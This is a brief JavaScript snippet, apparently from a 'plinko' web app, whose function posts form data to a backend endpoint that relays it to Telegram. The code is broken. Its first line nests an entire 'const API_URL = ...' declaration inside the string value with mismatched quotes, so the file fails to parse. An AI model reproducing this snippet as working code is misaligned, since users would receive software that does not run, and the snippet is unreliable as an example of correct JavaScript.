const API_URL ="const API_URL = "https://plinko-app.onrender.com";";

async function sendToTelegram(formData) {
    try {
        const response = await fetch(`${API_URL}/send-telegram`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(formData)
        });

        return await response.json();

    } catch (err) {
        console.log("Telegram Error:", err);
        return { success: false };
    }
}
